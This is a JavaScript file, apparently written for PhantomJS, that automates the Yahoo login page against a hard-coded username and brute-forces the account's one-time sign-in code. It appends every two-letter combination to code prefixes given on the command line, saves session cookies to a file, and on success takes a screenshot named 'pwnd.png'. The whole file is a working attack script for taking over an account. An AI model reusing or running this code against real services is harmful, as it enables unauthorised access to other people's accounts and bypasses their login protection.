var page = new WebPage(),
	fs = require('fs'),
	system = require('system'),
	args = system.args,
	CookieJar = "cookiejar.json",
	username = 'branceboren',
	code = 'MQKX',
	pageResponses = {},
	alphabet = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'],
	perms = [],
	testindex = 0,
	loadInProgress = false,
	stepTime = 10000, // 10 seconds is kinda ridiculous but it's safe
	firstTime = false; // set accordingly. NOTE: if it's the first time, it will fail and you will have to manually enter the 8 character code sent to you for now.  In the future there will be a way to intercept the cookie and use it for the attack.  The second time through (after you've successfully logged in with the 8 character code (check screenshots)) set this to true.

for(var i = 0; i<alphabet.length; i++){
	for(var j = 0; j < alphabet.length; j++){
		var combo = alphabet[i]+alphabet[j];
		perms.push(combo);
	}
}

if(firstTime){
	page.onResourceReceived = function(response) {
		pageResponses[response.url] = response.status;
		fs.write(CookieJar, JSON.stringify(phantom.cookies), "w");
	};
} // else optional page.onResourceReceived handler here

if(fs.isFile(CookieJar)){
	Array.prototype.forEach.call(JSON.parse(fs.read(CookieJar)), function(x){
		phantom.addCookie(x);
	});
}

page.onResourceRequested = function(requestData, networkRequest){
	if(requestData.url == 'https://www.yahoo.com/'){
		console.log('Successfully logged in!!!!');
		window.setTimeout(function(){
			page.render('pwnd.png');
			fs.writeSync(loggedInCookieJar, JSON.stringify(phantom.cookies), "w");
			phantom.exit();
		}, 10000);
		console.log('We\'re FREE!!!!');
	}
}
 
page.onConsoleMessage = function(msg) {
};
 
page.onLoadStarted = function() {
	loadInProgress = true;
};
 
page.onLoadFinished = function() {
	loadInProgress = false;
};

var loadPage = function() {
	page.settings.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11";
	page.open("https://login.yahoo.com/");
};

var enterCredentials = function(){
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(username) {
		$('#login-username').val(username);
		$('#persistent').removeAttr('checked');
		$('#login-signin').click();
		window.setTimeout(function(){
			$('#login-signin').click();
		},1000);
	}, username);
};

var tryLoggingIn = function(){
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function() {
		$('#mbr-login-form').submit();
	});
};

var sendTheCode = function(){
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(){
		$('#login-signin').click();
	});
};

var enterTheCode = function(){
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(code){
		$('#login-otp-passwd ').val(code);
		$('#login-otp-signin').click();
	}, code);	
};
var bruteforce = function(){
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(args, perms){
		var argIndex = 1;
		var permIndex = 0;
		var storedAttempt = $('[name="_seqid"]').first().attr('value');
		var count = 0;
		attack();
		timer = setInterval(function(){
			var sequenceId = $('[name="_seqid"]');
			if(null !== sequenceId){
				var checkAttempt = $('[name="_seqid"]').first().attr('value');
				if(storedAttempt != checkAttempt){
					storedAttempt = checkAttempt;
					attack();
				}
			} else {
				console.log('Successfully logged in!!!!');
				window.setTimeout(function(){
					page.render('pwnd.png');
					console.log(args[argIndex]+perms[permIndex]);
					phantom.exit();
				}, 10000);
			}
		}, 1);
		
		function attack(){
			var passInput = $('#login-otp-passwd');
			var passGen = getNextCombo();
			passInput.val(passGen);
			count++;
			$('#login-otp-signin').click();
		}
		
		function getNextCombo(){
			var a = argIndex;
			var p = permIndex;
			if(p < perms.length){
				permIndex++;
			} else{
				argIndex++;
				permIndex = 0;
			}
			if(a < args.length){
				return args[a]+perms[p];
			} else {
				console.log(args.toString()+' failed');
				phantom.exit();
			}
		}
	}, args, perms);
}


var steps = [
	loadPage,
	enterCredentials,
	tryLoggingIn,
	sendTheCode,
	bruteforce
];

if(!firstTime){
	// take out the steps that are required for the 8 character code 
	// but will break the 4 character code
	steps.splice(2,2);
}
 
interval = setInterval(function() {
	if (!loadInProgress && typeof steps[testindex] == "function") {
		steps[testindex]();
		testindex++;
	}
}, stepTime);